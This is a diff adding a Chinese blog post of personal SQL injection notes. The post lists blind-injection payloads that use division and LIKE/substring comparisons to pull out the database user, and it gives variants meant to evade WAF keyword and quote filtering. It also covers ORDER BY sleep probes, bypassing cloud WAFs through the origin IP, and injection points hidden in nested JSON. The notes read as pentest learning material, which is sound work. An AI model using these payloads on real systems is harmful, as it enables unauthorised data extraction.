@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>SQL笔记 - Lee&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Lee&#039;s Blog"><meta name="msapplication-TileImage" content="/img/雪人.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Lee&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="1234&amp;#x2F;exp(710-(current\_user like &amp;#x27;r%&amp;#x27;))&amp;#x2F;&amp;#x27;1&amp;#x2F;exp(710-(current\_user like &amp;#x27;r%&amp;#x27;))&amp;#x2F;11&amp;#x2F;(USER() like &amp;#x27;a%&amp;#x27;)&amp;#x27;&amp;#x2F;(USER() like &amp;#x27;r%&amp;#x27;)&amp;#x2F;&amp;#x27;1"><meta property="og:type" content="blog"><meta property="og:title" content="SQL笔记"><meta property="og:url" content="https://lee0568.github.io/2025/06/15/SQL%E7%AC%94%E8%AE%B0/"><meta property="og:site_name" content="Lee&#039;s Blog"><meta property="og:description" content="1234&amp;#x2F;exp(710-(current\_user like &amp;#x27;r%&amp;#x27;))&amp;#x2F;&amp;#x27;1&amp;#x2F;exp(710-(current\_user like &amp;#x27;r%&amp;#x27;))&amp;#x2F;11&amp;#x2F;(USER() like &amp;#x27;a%&amp;#x27;)&amp;#x27;&amp;#x2F;(USER() like &amp;#x27;r%&amp;#x27;)&amp;#x2F;&amp;#x27;1"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lee0568.github.io/img/og_image.png"><meta property="article:published_time" content="2025-06-14T22:23:47.000Z"><meta property="article:modified_time" content="2025-06-14T22:29:59.402Z"><meta property="article:author" content="John Doe"><meta property="article:tag" content="安全"><meta property="article:tag" content="SQL"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://lee0568.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://lee0568.github.io/2025/06/15/SQL%E7%AC%94%E8%AE%B0/"},"headline":"SQL笔记","image":["https://lee0568.github.io/img/og_image.png"],"datePublished":"2025-06-14T22:23:47.000Z","dateModified":"2025-06-14T22:29:59.402Z","author":{"@type":"Person","name":"John Doe"},"publisher":{"@type":"Organization","name":"Lee's Blog","logo":{"@type":"ImageObject","url":"https://lee0568.github.io/img/雪人.svg"}},"description":"1234&#x2F;exp(710-(current\\_user like &#x27;r%&#x27;))&#x2F;&#x27;1&#x2F;exp(710-(current\\_user like &#x27;r%&#x27;))&#x2F;11&#x2F;(USER() like &#x27;a%&#x27;)&#x27;&#x2F;(USER() like &#x27;r%&#x27;)&#x2F;&#x27;1"}</script><link rel="canonical" href="https://lee0568.github.io/2025/06/15/SQL%E7%AC%94%E8%AE%B0/"><link rel="icon" href="/img/%E9%9B%AA%E4%BA%BA.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/%E9%9B%AA%E4%BA%BA.svg" alt="Lee&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">更新链条</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">我</a></div><div class="navbar-end"><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-06-14T22:23:47.000Z" title="2025/6/15 06:23:47">2025-06-15</time>发表</span><span class="level-item"><time dateTime="2025-06-14T22:29:59.402Z" title="2025/6/15 06:29:59">2025-06-15</time>更新</span><span class="level-item">5 分钟读完 (大约812个字)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">SQL笔记</h1><div class="content"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/exp(710-(current\_user like &#x27;r%&#x27;))/&#x27;1</span><br><span class="line">/exp(710-(current\_user like &#x27;r%&#x27;))/1</span><br><span class="line">1/(USER() like &#x27;a%&#x27;)</span><br><span class="line">&#x27;/(USER() like &#x27;r%&#x27;)/&#x27;1</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h2 id="四则运算符测试sql注入"><a href="#四则运算符测试sql注入" class="headerlink" title="四则运算符测试sql注入"></a>四则运算符测试sql注入</h2><p>要有危害，搞个表名出来，数据库名。有表名证明可以用select，证明整个数据库都可以读，证明可以利用，这样就可以交了</p>
+<p><code>select \* from test where id = 1 and 1;</code>这是最简单的方法，来刺探是否有sql注入的</p>
+<p><code>SELECT \* from chat WHERE id = 1 UNION SELECT 1,1,1;</code>这种在网上基本不可能，太多关键词会被拦截</p>
+<p><code>select \* from test where id = 1/(&#39;a&#39; like &#39;a%&#39;);</code>但是上面那种基本遇不到了，大多会被拦截。所以要用四则运算的刺探</p>
+<p>可以用加减乘除都可以，推荐用除（&#x2F;）</p>
+<p>(‘a’ like ‘a%’)这就是1</p>
+<p><code>SELECT \* from chat WHERE id = 1/(user() like &#39;r%&#39;);</code>这句话可以拿来跑数据用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from chat WHERE id = 1/(user() like 0x25);</span><br><span class="line">SELECT * from chat WHERE id = 1/(CURRENT_USER like 0x25);</span><br><span class="line">SELECT * from chat WHERE id = 1/(CURRENT_USER REGEXP &#x27;^r.*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>上面的可以利用替换，防止拦截引号和括号和like情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from chat where id=1/(SUBSTR(CURRENT_USER,1,2)=&#x27;ro&#x27;);</span><br><span class="line">SELECT * from chat where id=1/(substring(CURRENT_USER,1,2)=&#x27;ro&#x27;);</span><br><span class="line">SELECT * from chat where id=1/(substring(CURRENT_USER,1,2)=0x726f);</span><br></pre></td></tr></table></figure>
+
+<p>也可以用substr来进行爆破。</p>
+<p>数字型也会包裹在双引号里传递，只需要改变一下方式就好</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=&#x27;1&#x27;and&#x27;1&#x27;;</span><br><span class="line">select * from test where id=&#x27;1&#x27;/0/&#x27;1&#x27;;</span><br><span class="line">select * from test where id=&#x27;1&#x27;/(current_user like &#x27;r%&#x27;)/&#x27;1&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>少用+–注释，因为企业都是很多括号很长的查询语句，加注释后，没法闭合，直接报错。</p>
+<p>也少用or和sleep，因为是输入的参数可能不止用作查询，也可能后面跟了其他的语句，比如删除，用or就直接没了</p>
+<p>若是id不等于1的话，有几行数据就sleep多少秒，多了数据库直接拒绝服务了。总之别乱用</p>
+<p>对于长度限制的模糊查询，有局限，比如test@test就出不来，只能确定有test</p>
+<p>select ord(user())&#x3D;114;<br>出数据最短的，可是我有疑问，这样不是没法利用吗？</p>
+<p>ord可以代替acsii，substring替代substr，还有sub_string,lift</p>
+<p>云waf，通过真实ip绕过，因为云waf绑定在域名上。</p>
+<h2 id="order的sql注入"><a href="#order的sql注入" class="headerlink" title="order的sql注入"></a>order的sql注入</h2><p>Orderby很关键，因为这是不能预编译的。Id处，dsec处，只要它可以传参数，那很有可能有漏洞，id后面看能不能拼接语句，加上1和0会不会报错，不要加sleep，如果order查不出东西，那sleep不会执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 order by id,if((user() like &#x27;r%&#x27;),1,sleep(1)) desc</span><br><span class="line">select * from test where id=1 order by id desc,if((user() like &#x27;a%&#x27;),1,sleep(1)) 有数据这么查，应该还有简单的。</span><br><span class="line">select * from test where id=1 order by id,(select sleep(1)) desc</span><br><span class="line">select * from test where id=1 order by id,if((user() like &#x27;a%&#x27;),1,(select sleep(1))) desc无数据这查</span><br></pre></td></tr></table></figure>
+
+<h2 id="json格式注意点"><a href="#json格式注意点" class="headerlink" title="json格式注意点"></a>json格式注意点</h2><p><code>&#123;&quot;a:&quot;&#123;\\&quot;b\\&quot;:\\&quot;c\\&quot;&#125;&quot;&#125;</code></p>
+<p>他只能看到a的值，但是如果是c是注入点，那他是不会扫出来的。</p>
+<p><code>Data=[&#123;&quot;a&quot;:&quot;b&quot;&#125;]</code></p>
+<p>这样也是，补充说，如果是字母，那就加引号，双引号。</p>
+<p><code>Data=[&#123;&quot;a&quot;:&quot;b‘\\&quot;&quot;&#125;]</code></p>
+<p>如果是数字就加&#x2F;1</p>
+<p><code>Data=[&#123;&quot;a&quot;:&quot;1/1&quot;&#125;]</code></p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>SQL笔记</p><p><a href="https://lee0568.github.io/2025/06/15/SQL笔记/">https://lee0568.github.io/2025/06/15/SQL笔记/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>John Doe</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2025-06-15</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2025-06-15</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E5%AE%89%E5%85%A8/">安全</a><a class="link-muted mr-2" rel="tag" href="/tags/SQL/">SQL</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2025/05/23/%E5%A4%95%E6%9A%AE%E3%82%8C/"><span class="level-item">夕暮れ</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card" id="comments"><div class="card-content"><h3 class="title is-5">评论</h3><script src="https://utteranc.es/client.js" repo="Lee0568/Lee0568.github.io" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script></div></div></div><!--!--><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/%E9%9B%AA%E4%BA%BA.svg" alt="Lee&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2025 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p><p class="is-size-7">© 2025</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
